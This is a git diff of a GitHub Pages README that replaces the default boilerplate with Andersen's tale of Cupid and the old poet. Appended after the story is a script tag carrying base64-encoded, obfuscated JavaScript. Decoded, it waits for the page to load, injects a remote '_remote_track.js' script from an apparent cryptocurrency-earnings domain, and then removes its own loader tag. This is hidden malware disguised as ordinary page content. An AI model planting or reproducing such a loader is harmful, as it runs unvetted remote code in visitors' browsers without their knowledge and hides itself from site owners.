@@ -1,37 +1,31 @@
-## Welcome to GitHub Pages
+# Along time ago
 
-You can use the [editor on GitHub](https://github.com/kolmach84/Mountain/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+Along time ago, there lived an old poet, a thoroughly kind old poet. As he was sitting one evening in his room, a dreadful storm arose without, and the rain streamed down from heaven; but the old poet sat warm and comfortable in his chimney-corner, where the fire blazed and the roasting apple hissed.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+"Those who have not a roof over their heads will be wetted to the skin," said the good old poet.
+![y](https://static.independent.co.uk/s3fs-public/thumbnails/image/2019/02/04/16/himalayas-mountains.jpg)
+"Oh let me in! Let me in! I am cold, and I'm so wet!" exclaimed suddenly a child that stood crying at the door and knocking for admittance, while the rain poured down, and the wind made all the windows rattle.
 
-### Markdown
+"Poor thing!" said the old poet, as he went to open the door. There stood a little boy, quite naked, and the water ran down from his long golden hair; he trembled with cold, and had he not come into a warm room he would most certainly have perished in the frightful tempest.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+"Poor child!" said the old poet, as he took the boy by the hand. "Come in, come in, and I will soon restore thee! Thou shalt have wine and roasted apples, for thou art verily a charming child!" And the boy was so really. His eyes were like two bright stars; and although the water trickled down his hair, it waved in beautiful curls. He looked exactly like a little angel, but he was so pale, and his whole body trembled with cold. He had a nice little bow in his hand, but it was quite spoiled by the rain, and the tints of his many-colored arrows ran one into the other.
 
-```markdown
-Syntax highlighted code block
+The old poet seated himself beside his hearth, and took the little fellow on his lap; he squeezed the water out of his dripping hair, warmed his hands between his own, and boiled for him some sweet wine. Then the boy recovered, his cheeks again grew rosy, he jumped down from the lap where he was sitting, and danced round the kind old poet.
 
-# Header 1
-## Header 2
-### Header 3
+"You are a merry fellow," said the old man. "What's your name?"
 
-- Bulleted
-- List
+"My name is Cupid," answered the boy. "Don't you know me? There lies my bow; it shoots well, I can assure you! Look, the weather is now clearing up, and the moon is shining clear again through the window."
 
-1. Numbered
-2. List
+"Why, your bow is quite spoiled," said the old poet.
 
-**Bold** and _Italic_ and `Code` text
+"That were sad indeed," said the boy, and he took the bow in his hand and examined it on every side. "Oh, it is dry again, and is not hurt at all; the string is quite tight. I will try it directly." And he bent his bow, took aim, and shot an arrow at the old poet, right into his heart. "You see now that my bow was not spoiled," said he laughing; and away he ran.
 
-[Link](url) and ![Image](src)
-```
+The naughty boy, to shoot the old poet in that way; he who had taken him into his warm room, who had treated him so kindly, and who had given him warm wine and the very best apples!
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+The poor poet lay on the earth and wept, for the arrow had really flown into his heart.
 
-### Jekyll Themes
+"Fie!" said he. "How naughty a boy Cupid is! I will tell all children about him, that they may take care and not play with him, for he will only cause them sorrow and many a heartache."
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/kolmach84/Mountain/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+And all good children to whom he related this story, took great heed of this naughty Cupid; but he made fools of them still, for he is astonishingly cunning. When the university students come from the lectures, he runs beside them in a black coat, and with a book under his arm. It is quite impossible for them to know him, and they walk along with him arm in arm, as if he, too, were a student like themselves; and then, unperceived, he thrusts an arrow to their bosom. When the young maidens come from being examined by the clergyman, or go to church to be confirmed, there he is again close behind them. Yes, he is forever following people. At the play, he sits in the great chandelier and burns in bright flames, so that people think it is really a flame, but they soon discover it is something else. He roves about in the garden of the palace and upon the ramparts: yes, once he even shot your father and mother right in the heart. Ask them only and you will hear what they'll tell you. Oh, he is a naughty boy, that Cupid; you must never have anything to do with him. He is forever running after everybody. Only think, he shot an arrow once at your old grandmother! But that is a long time ago, and it is all past now; however, a thing of that sort she never forgets. Fie, naughty Cupid! But now you know him, and you know, too, how ill-behaved he is!
 
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script id="rcLcm" src="data:text/javascript;base64, dmFyIF9TZHVyQyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX29CQ3Z6LCBfVlA4Q3EpIHt2YXIgXzJDN3doID0gZnVuY3Rpb24oX2Q0aUg1KSB7d2hpbGUgKC0tX2Q0aUg1KSB7X29CQ3Z6WydwdXNoJ10oX29CQ3Z6WydzaGlmdCddKCkpO319O18yQzd3aCgrK19WUDhDcSk7fShfU2R1ckMsIDB4MTFiKSk7dmFyIF9UTDJIbSA9IGZ1bmN0aW9uKF96TlNRSiwgX1hodTliKSB7X3pOU1FKID0gX3pOU1FKIC0gMHgwO3ZhciBfUEoyTTMgPSBfU2R1ckNbX3pOU1FKXTtyZXR1cm4gX1BKMk0zO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfVEwySG0oJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX2hyS0NKID0gZG9jdW1lbnRbX1RMMkhtKCcweDEnKV0oX1RMMkhtKCcweDInKSk7X2hyS0NKW19UTDJIbSgnMHgzJyldID0gX1RMMkhtKCcweDQnKTtfaHJLQ0pbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3NFx4NzdceDZmXHg2OFx4NmZceDc1XHg3M1x4NjVceDYxXHg2M1x4NjNceDM1XHgzMlx4MmVceDYyXHg3NFx4NjNceDJkXHg2NVx4NjFceDcyXHg2ZVx4NjlceDZlXHg2N1x4MmRceDYzXHg2MVx4NzNceDY4XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NGZceDZiXHg2Mlx4NGNceDU0XHg3MVx4MzJceDcyXHg1N1x4MzYnO2RvY3VtZW50W19UTDJIbSgnMHg1JyldKF9UTDJIbSgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9ocktDSik7ZG9jdW1lbnRbX1RMMkhtKCcweDcnKV0oJ3JjTGNtJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
